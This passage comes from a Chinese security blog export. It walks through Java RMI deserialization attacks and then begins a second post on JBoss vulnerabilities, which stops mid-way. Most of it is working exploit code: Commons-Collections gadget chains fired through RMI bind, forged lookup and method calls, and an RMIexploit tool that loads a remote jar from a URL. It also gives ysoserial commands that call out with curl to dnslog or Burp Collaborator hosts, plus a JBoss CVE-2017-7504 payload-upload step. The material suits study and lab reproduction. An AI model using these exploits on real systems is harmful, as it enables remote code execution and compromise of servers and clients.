继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法） 构造函数需要抛出一个RemoteException错误 实现类中使用的对象必须都可序列化，即都继承java.io.Serializable 注册远程对象 123456789101112import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123; public static void main(String[] args) throws RemoteException &#123; rmi hello = new RemoteClass();//创建远程对象 Registry registry = LocateRegistry.createRegistry(1099);//创建注册表 registry.rebind(\"hello\",hello);//将远程对象注册到注册表里面，并且设置值为hello &#125;&#125; 关于绑定的地址很多地方会rmi://ip:port/Objectname的形式，实际上看rebind源码就知道RMI:写不写都行，port如果默认是1099，不写会自动补上，其他端口必须写那么服务端就部署好了，来看客户端 2.客户端部署 1234567891011121314import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client &#123; public static void main(String[] args) throws RemoteException, NotBoundException &#123; Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099);//获取远程主机对象 // 利用注册表的代理去查询远程注册表中名为hello的对象 RemoteClass hello = (RemoteClass) registry.lookup(\"hello\"); // 调用远程方法 System.out.println(hello.hello()); &#125;&#125; 那么先运行服务端，再运行客户端，就可以完成调用 攻击方式详情可看此文章：https://paper.seebug.org/1251/#java-rmi- 攻击注册中心浅谈Java RMI Registry安全问题 我们与注册中心进行交互可以使用如下几种方式 12345678listbindrebindunbindlookup``` 这几种方法位于RegistryImpl_Skel#dispatch中，如果存在readObject，则可以利用 dispatch里面对应关系如下 0-&gt;bind1-&gt;list2-&gt;lookup3-&gt;rebind4-&gt;unbind 12345678910111213list&#96;&#96;&#96;java case 1: var2.releaseInputStream(); String[] var79 &#x3D; var6.list(); try &#123; ObjectOutput var81 &#x3D; var2.getResultStream(true); var81.writeObject(var79); break; &#125; catch (IOException var75) &#123; throw new MarshalException(&quot;error marshalling return&quot;, var75); &#125; 这里没有readObject所以无法利用 bind&amp;rebindJDK版本在8u141之后， 这里会先去判断是否为本地绑定请求，然后再进行反序列化。 所以如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前 123456789101112131415161718192021222324252627282930313233343536373839404142case 0: RegistryImpl.checkAccess(\"Registry.bind\"); try &#123; var9 = var2.getInputStream(); var7 = (String)var9.readObject(); var80 = (Remote)var9.readObject(); &#125; catch (ClassNotFoundException | IOException var77) &#123; throw new UnmarshalException(\"error unmarshalling arguments\", var77); &#125; finally &#123; var2.releaseInputStream(); &#125; var6.bind(var7, var80); try &#123; var2.getResultStream(true); break; &#125; catch (IOException var76) &#123; throw new MarshalException(\"error marshalling return\", var76); &#125;case 3: RegistryImpl.checkAccess(\"Registry.rebind\"); try &#123; var9 = var2.getInputStream(); var7 = (String)var9.readObject(); var80 = (Remote)var9.readObject(); &#125; catch (ClassNotFoundException | IOException var70) &#123; throw new UnmarshalException(\"error unmarshalling arguments\", var70); &#125; finally &#123; var2.releaseInputStream(); &#125; var6.rebind(var7, var80); try &#123; var2.getResultStream(true); break; &#125; catch (IOException var69) &#123; throw new MarshalException(\"error marshalling return\", var69); &#125; 当调用bind时，会用readObject读出参数名以及远程对象，此时则可以利用 当调用rebind时，会用readObject读出参数名和远程对象，这里和bind是一样的，所以都可以利用 如果服务端存在cc1相关组件漏洞，那么就可以使用反序列化攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class Client &#123; public static void main(String[] args) throws Exception &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"open /System/Applications/Calculator.app\"&#125;)&#125;); HashMap innermap = new HashMap(); Class clazz = Class.forName(\"org.apache.commons.collections.map.LazyMap\"); Constructor[] constructors = clazz.getDeclaredConstructors(); Constructor constructor = constructors[0]; constructor.setAccessible(true); Map map = (Map)constructor.newInstance(innermap,chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象 Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map); Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",8888); Remote r = Remote.class.cast(Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] &#123; Remote.class &#125;, handler)); registry.bind(\"test\",r); &#125;&#125; 这里用的是cc1的链，所以服务端自然也需要存在cc1相关的漏洞组件才行。 重点关注： 123Remote r = Remote.class.cast(Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] &#123; Remote.class &#125;, handler)); Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象： 123Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] &#123; Remote.class &#125;, handler) 上述代码中创建了一个代理对象，这个代理对象代理了Remote.class接口，handler为我们的handler对象。当调用这个代理对象的一切方法时，最终都会转到调用handler的invoke方法。 而handler是InvocationHandler对象，所以这里在反序列化时会调用InvocationHandler对象的invoke方法 1234567891011…… switch(var7) &#123; case 0: return this.toStringImpl(); case 1: return this.hashCodeImpl(); case 2: return this.type; default: Object var6 = this.memberValues.get(var4);…… 在invoke方法里，同样会触发memberValues的get方法，此时的memberValues是proxy_map，其也是一个代理类对象，所以会继续触发proxy_map的invoke方法，后边的就是cc1的前半段内容了 unbind &amp; lookup1234567891011121314151617181920212223242526272829303132333435363738394041case 4: RegistryImpl.checkAccess(\"Registry.unbind\"); try &#123; var8 = var2.getInputStream(); var7 = (String)var8.readObject(); &#125; catch (ClassNotFoundException | IOException var67) &#123; throw new UnmarshalException(\"error unmarshalling arguments\", var67); &#125; finally &#123; var2.releaseInputStream(); &#125; var6.unbind(var7); try &#123; var2.getResultStream(true); break; &#125; catch (IOException var66) &#123; throw new MarshalException(\"error marshalling return\", var66); &#125; case 2: try &#123; var8 = var2.getInputStream(); var7 = (String)var8.readObject(); &#125; catch (ClassNotFoundException | IOException var73) &#123; throw new UnmarshalException(\"error unmarshalling arguments\", var73); &#125; finally &#123; var2.releaseInputStream(); &#125; var80 = var6.lookup(var7); try &#123; ObjectOutput var82 = var2.getResultStream(true); var82.writeObject(var80); break; &#125; catch (IOException var72) &#123; throw new MarshalException(\"error marshalling return\", var72); &#125; 从上述代码中我们可以发现，unbind和lookup实际上都会调用readObject来读取传递过来的参数，所以同样是可以利用的。 不过这里有一个问题，当我们调用unbind或者lookup时，只允许我们传递字符串，所以没法传递我们的恶意对象。 这个问题要解决有几种办法： 伪造连接请求 rasp hook请求代码，修改发送数据 我用的是第一种，也是比较简单的一种，直接通过反射就能实现。 想要手动伪造请求，我们就需要去判断一下当执行lookup时，会经过怎样的流程。 在调用lookup之前，我们需要先获取客户端，通过getRegistry方法返回的是一个Registry_Stub对象。 RegistryImpl_Stub#lookup 123456789101112131415161718192021222324252627282930313233343536public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException &#123; try &#123; RemoteCall var2 = this.ref.newCall(this, operations, 2, 4905912898345647071L); try &#123; ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(var1); &#125; catch (IOException var17) &#123; throw new MarshalException(\"error marshalling arguments\", var17); &#125; this.ref.invoke(var2); Remote var22; try &#123; ObjectInput var4 = var2.getInputStream(); var22 = (Remote)var4.readObject(); &#125; catch (IOException var14) &#123; throw new UnmarshalException(\"error unmarshalling return\", var14); &#125; catch (ClassNotFoundException var15) &#123; throw new UnmarshalException(\"error unmarshalling return\", var15); &#125; finally &#123; this.ref.done(var2); &#125; return var22; &#125; catch (RuntimeException var18) &#123; throw var18; &#125; catch (RemoteException var19) &#123; throw var19; &#125; catch (NotBoundException var20) &#123; throw var20; &#125; catch (Exception var21) &#123; throw new UnexpectedException(\"undeclared checked exception\", var21); &#125;&#125; exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import sun.rmi.server.UnicastRef;import java.io.ObjectOutput;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.Operation;import java.rmi.server.RemoteCall;import java.rmi.server.RemoteObject;import java.util.HashMap;import java.util.Map;public class Clienthack &#123; public static void main(String[] args) throws Exception &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); HashMap innermap = new HashMap(); Class clazz = Class.forName(\"org.apache.commons.collections.map.LazyMap\"); Constructor[] constructors = clazz.getDeclaredConstructors(); Constructor constructor = constructors[0]; constructor.setAccessible(true); Map map = (Map)constructor.newInstance(innermap,chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象 Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);// Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",8888); Remote r = Remote.class.cast(Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] &#123; Remote.class &#125;, handler)); // 获取ref Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(registry); //获取operations Field[] fields_1 = registry.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry); // 伪造lookup的代码，去伪造传输信息 RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(r); ref.invoke(var2); &#125;&#125; 攻击客户端在通信过程中，RMI与注册中心以及服务端进行了交互，我们需要对这两者做手脚，从而达到攻击客户端的目的。 注册中心攻击客户端对于注册中心来说，我们还是从这几个方法触发： 12345bindunbindrebindlistlookup 这里的每个方法，除了unbind和rebind，其他的都会返回数据给客户端，此时的数据是序列化的数据，所以客户端自然也会反序列化，那么我们只需要伪造注册中心的返回数据，就可以达到攻击客户端的效果啦。 这里yso的JRMPListener已经做好了，命令如下 1java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 \"calc\" elient 123456789101112import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",12345); registry.lookup(\"calc\"); &#125;&#125; 服务中心攻击客户端服务端攻击客户端，大抵可以分为以下两种情景。 服务端返回参数为Object对象 可以使用codebase 服务端返回参数为Object对象在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。 所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。 这里我还是以cc1为例，简单的演示一下。User接口 12345import java.rmi.RemoteException;public interface User extends java.rmi.Remote &#123; public Object getUser() throws RemoteException;&#125; 恶意UserImpl： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.Serializable;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.HashMap;import java.util.Map;public class LocalUser extends UnicastRemoteObject implements User &#123; public String name; public int age; public LocalUser(String name, int age) throws RemoteException &#123; super(); this.name = name; this.age = age; &#125; public Object getUser()&#123; InvocationHandler handler = null; try &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123; \"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"open /System/Applications/Calculator.app\"&#125;)&#125;); HashMap innermap = new HashMap(); Class clazz = Class.forName(\"org.apache.commons.collections.map.LazyMap\"); Constructor[] constructors = clazz.getDeclaredConstructors(); Constructor constructor = constructors[0]; constructor.setAccessible(true); Map map = (Map) constructor.newInstance(innermap, chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); //创建第一个代理的handler Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Map.class&#125;, map_handler); //创建proxy对象 Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; return (Object)handler; &#125; public String getName()&#123; return \"[\"+this.name+\"]\"; &#125; public void updateName(String name)&#123; this.name = name; &#125; public void addUser(Object user) throws RemoteException &#123; &#125;&#125; 恶意服务端： 1234567891011121314151617181920212223import java.rmi.AlreadyBoundException;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.concurrent.CountDownLatch;public class Server &#123; public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException &#123; User liming = new LocalUser(\"liming\",15); Registry registry = LocateRegistry.createRegistry(8888); registry.bind(\"user\",liming); System.out.println(\"registry is running...\"); System.out.println(\"liming is bind in registry\"); CountDownLatch latch=new CountDownLatch(1); latch.await(); &#125;&#125; 此时当客户端调用服务端绑定的远程对象的getUser方法时，将反序列化服务端传来的恶意远程对象。此时将触发Rce。 12345678910111213import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",8888); User user= (User) registry.lookup(\"user\"); user.getUser(); &#125;&#125; 远程加载对象 这个条件十分十分苛刻，在现实生活中基本不可能碰到。 当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。 具体可以参考这篇文章，利用条件太过于苛刻了：https://paper.seebug.org/1091/#serverrmi-server java.security.policy这个默认是没有配置的，需要我们手动去配置。 攻击服务端上面说了利用注册中心攻击客户端，同样的方法也可以攻击服务端，这里说一下客户端攻击服务端的方式 当服务端的远程方法存在Object参数的情况下 在上上面写了，如果服务端的某个方法，传递的参数是Object类型的参数，当服务端接收数据时，就会调用readObject，所以我们可以从这个角度入手来攻击服务端。 前提： 服务端的某个远程方法传递参数为Object我们需要先在User接口中新增这么一个方法： 123456789import java.rmi.RemoteException;public interface User extends java.rmi.Remote &#123; public String getName() throws RemoteException;; public User getUser() throws RemoteException; public void updateName(String name) throws RemoteException;; public void addUser(Object user) throws RemoteException;&#125;` 此时多了一个addUser方法，当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化。 Client Demo： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class Client &#123; public static void main(String[] args) throws Exception &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"open /System/Applications/Calculator.app\"&#125;)&#125;); HashMap innermap = new HashMap(); Class clazz = Class.forName(\"org.apache.commons.collections.map.LazyMap\"); Constructor[] constructors = clazz.getDeclaredConstructors(); Constructor constructor = constructors[0]; constructor.setAccessible(true); Map map = (Map)constructor.newInstance(innermap,chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象 Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map); Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",8888); User user = (User) registry.lookup(\"user\"); user.addUser(handler); &#125;&#125; 远程加载对象 和上边Server打Client一样，都属于十分十分十分难利用的点。 参考：https://paper.seebug.org/1091/#serverrmi 基于报错回显的 payload详情可看此文章：https://xz.aliyun.com/t/2223 网上流传的基于报错回显的 payload先抛出 rmi 反序列化的exp 本地： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.net.URLClassLoader;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class RMIexploit &#123; public static Constructor&lt;?&gt; getFirstCtor(final String name) throws Exception &#123; final Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0]; ctor.setAccessible(true); return ctor; &#125; public static void main(String[] args) throws Exception &#123; if (args.length &lt; 4) &#123; System.out.println( \" Usage: java -jar RMIexploit.jar ip port jarfile command\"); System.out.println( \" Example: java -jar RMIexploit.jar 123.123.123.123 1099 http://1.1.1.1.1/ErrorBaseExec.jar \\\"ls -l\\\"\"); return; &#125; String ip = args[0]; int port = Integer.parseInt(args[1]); String remotejar = args[2]; String command = args[3]; final String ANN_INV_HANDLER_CLASS = \"sun.reflect.annotation.AnnotationInvocationHandler\"; try &#123; final Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(java.net.URLClassLoader.class), new InvokerTransformer(\"getConstructor\", new Class[] &#123; Class[].class &#125;, new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;), new InvokerTransformer(\"newInstance\", new Class[] &#123; Object[].class &#125;, new Object[] &#123; new Object[] &#123; new java.net.URL[] &#123; new java.net.URL(remotejar) &#125; &#125; &#125;), new InvokerTransformer(\"loadClass\", new Class[] &#123; String.class &#125;, new Object[] &#123; \"exploit.ErrorBaseExec\" &#125;), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"do_exec\", new Class[] &#123; String.class &#125; &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new String[] &#123; command &#125; &#125;) &#125;; Transformer transformedChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); Class cl = Class.forName( \"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, outerMap); Registry registry = LocateRegistry.getRegistry(ip, port); InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS) .newInstance(Target.class, outerMap); Remote r = Remote.class.cast(Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] &#123; Remote.class &#125;, h)); registry.bind(\"pwned\", r); &#125; catch (Exception e) &#123; try &#123; System.out.print(e.getCause().getCause().getCause().getMessage()); &#125; catch (Exception ee) &#123; throw e; &#125; &#125; &#125;&#125; 远程： 123456789101112131415161718192021222324252627282930313233343536373839404142package exploit;import java.io.*;public class ErrorBaseExec &#123; public static byte[] readBytes(InputStream in) throws IOException &#123; BufferedInputStream bufin = new BufferedInputStream(in); int buffSize = 1024; ByteArrayOutputStream out = new ByteArrayOutputStream(buffSize); byte[] temp = new byte[buffSize]; int size = 0; while ((size = bufin.read(temp)) != -1) &#123; out.write(temp, 0, size); &#125; bufin.close(); byte[] content = out.toByteArray(); return content; &#125; public static void do_exec(String cmd) throws Exception &#123; final Process p = Runtime.getRuntime().exec(cmd); final byte[] stderr = readBytes(p.getErrorStream()); final byte[] stdout = readBytes(p.getInputStream()); final int exitValue = p.waitFor(); if (exitValue == 0) &#123; throw new Exception(\"-----------------\\r\\n\" + (new String(stdout)) + \"-----------------\\r\\n\"); &#125; else &#123; throw new Exception(\"-----------------\\r\\n\" + (new String(stderr)) + \"-----------------\\r\\n\"); &#125; &#125; public static void main(final String[] args) throws Exception &#123; do_exec(\"cmd /c dir\"); &#125;&#125; 其他可看此文章：https://paper.seebug.org/1251/#rmijdk 漏洞复现Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).执行如下命令编译及启动RMI Registry和服务器： 123456cd ./java/rmi-registry-bind-deserializationdocker-compose builddocker-compose run -e RMIIP=your-ip -p 1099:1099 rmi//其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。//环境启动后，RMI Registry监听在1099端口。 通过ysoserial的exploit包中的RMIRegistryExploit进行攻击 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 \"curl your-dnslog-server\" Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1). 自jdk8u121起，Registry对反序列化的类做了白名单限制 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED;&#125; else &#123; return ObjectInputFilter.Status.REJECTED;&#125; 我们需要在上面的几个白名单里面找到相应的可利用的类 具体原理见浅谈Java RMI Registry安全问题 执行如下命令编译及启动RMI Registry和服务器： 12345678910111213cd ./java/rmi-registry-bind-deserialization-bypassdocker-compose builddocker-compose run -e RMIIP=your-ip -p 1099:1099 rmi//其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。//环境启动后，RMI Registry监听在1099端口。``` 通过ysoserial的exploit包中的RMIRegistryExploit2或者3进行攻击```java// 开启JRMPListenerjava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 \"curl http://xxxxx.burpcollaborator.net\"// 发起攻击java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888 参考文章Java安全之RMI反序列化JAVA RMI反序列化知识详解浅谈Java RMI Registry安全问题Java 安全-RMI-学习总结 https://vulhub.org/#/environments/java/rmi-registry-bind-deserialization/","categories":[],"tags":[],"author":"ye1s"},{"title":"JBOSS漏洞总结","slug":"JBOSS漏洞总结","date":"2021-03-25T03:25:57.000Z","updated":"2021-03-25T09:51:43.852Z","comments":true,"path":"article/46405233.html","link":"","permalink":"https://blog.cfyqy.com/article/46405233.html","excerpt":"JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行。","text":"JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行。 JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。 参考利用工具JavaDeserH2HC，我们选择一个Gadget：ExampleCommonsCollections1WithHashMap，编译并生成序列化数据： 12javac -cp commons-collections-3.2.1.jar; ExampleCommonsCollections1WithHashMap.javajava -cp commons-collections-3.2.1.jar; ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot; 注意点 javac -cp 指明了.java文件里import的类的位置 java -cp 指明了执行这个class文件所需要的所有类的包路径-即系统类加载器的路径（涉及到类加载机制） 路径在linux中用：隔开 在windows中用；隔开 可见，我们执行的命令是touch /tmp/success。执行完成后，将生成一个文件ExampleCommonsCollections1WithHashMap.ser，将该文件作为body发送如下数据包： 1curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser 或使用 Postman JBoss5.x/6.x反序列化漏洞（CVE-2017-12149）该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。 编写反弹shell的命令 